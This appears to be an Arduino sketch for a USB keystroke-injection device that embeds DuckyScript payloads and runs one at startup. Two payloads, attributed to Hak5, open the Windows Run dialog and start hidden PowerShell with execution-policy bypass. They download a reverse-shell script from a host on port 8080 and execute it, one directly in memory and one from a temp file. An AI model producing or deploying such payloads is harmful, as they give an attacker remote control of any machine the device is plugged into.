#include <USBAPI.h>
#include <Arduino.h>
#include <Keyboard.h>
#include <SPI.h>
#include <SD.h>
#include <Interpreter.hxx>


void setup() {
  delay(2000);
  char test_1[] = R"__SCRIPT(
    a b c
    ENTER
    GUI SHIFT ENTER
    DELAY 1000
    STRING echo 'YOU GOT HACKED!!!!!!!!'
    ENTER
    SHIFT A
  )__SCRIPT";

  char test_windows_reverse_shell_1[] = R"__SCRIPT(
    REM Author: Hak5
    REM Target: Windows
    REM Description: Downloads and executes a PowerShell reverse shell
    DELAY 3000
    GUI r
    DELAY 200
    STRING powershell -w hidden -NoP -NonI -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.1.12:8080/shell.ps1')"
    ENTER
  )__SCRIPT";

  char test_windows_reverse_shell_2[] = R"__SCRIPT(
    REM Author: Hak5
    REM Target: Windows
    REM Description: Downloads and executes a PowerShell reverse shell
    DELAY 3000
    GUI r
    DELAY 200
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.1.12:8080/shell1.ps1' -OutFile '$env:TEMP\s.ps1'; powershell -File '$env:TEMP\s.ps1'"
    ENTER
  )__SCRIPT";



  Interpreter interpreter;
  interpreter.exec_script(test_windows_reverse_shell_1);
  // Serial.begin(9600);
}

void loop() {
  Serial.println("Done");
  delay(1000);
}
